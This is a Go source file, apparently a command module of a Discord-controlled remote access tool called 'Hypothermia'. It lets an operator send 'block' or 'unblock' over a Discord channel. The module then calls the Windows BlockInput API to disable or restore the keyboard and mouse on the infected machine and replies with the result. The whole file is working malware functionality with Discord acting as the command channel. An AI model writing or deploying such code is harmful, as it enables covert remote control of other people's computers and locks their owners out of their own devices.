package commands

import (
	"fmt"
	"syscall"

	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	inputUsage string = "[block/unblock]"

	inputArgsError string = "🟥 Expected 1 argument."
	inputUseError  string = "🟥 Invalid argument."
	inputFuncError string = "🟥 Failed to call function: %s"

	inputSuccess string = "🟩 Success in calling function."
)

var blockInput *syscall.LazyProc = utils.User32.NewProc("BlockInput")

func (*InputCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if len(args) == 0 {
		_, err := s.ChannelMessageSendReply(m.ChannelID, inputArgsError+"\nUsage: "+inputUsage, m.Reference())
		return err
	}

	var status int
	if args[0] == "block" {
		status = 1
	} else if args[0] == "unblock" {
		status = 0
	} else {
		_, err := s.ChannelMessageSendReply(m.ChannelID, inputUseError+"\nUsage: "+inputUsage, m.Reference())
		return err
	}

	ret, _, err := blockInput.Call(uintptr(status))
	if ret == 0 {
		_, err := s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(inputFuncError, err), m.Reference())
		return err
	}

	_, err = s.ChannelMessageSendReply(m.ChannelID, inputSuccess, m.Reference())
	return err
}

func (*InputCommand) Name() string {
	return "input"
}

func (*InputCommand) Info() string {
	return "blocks or unblocks inputs form the users device"
}

type InputCommand struct{}
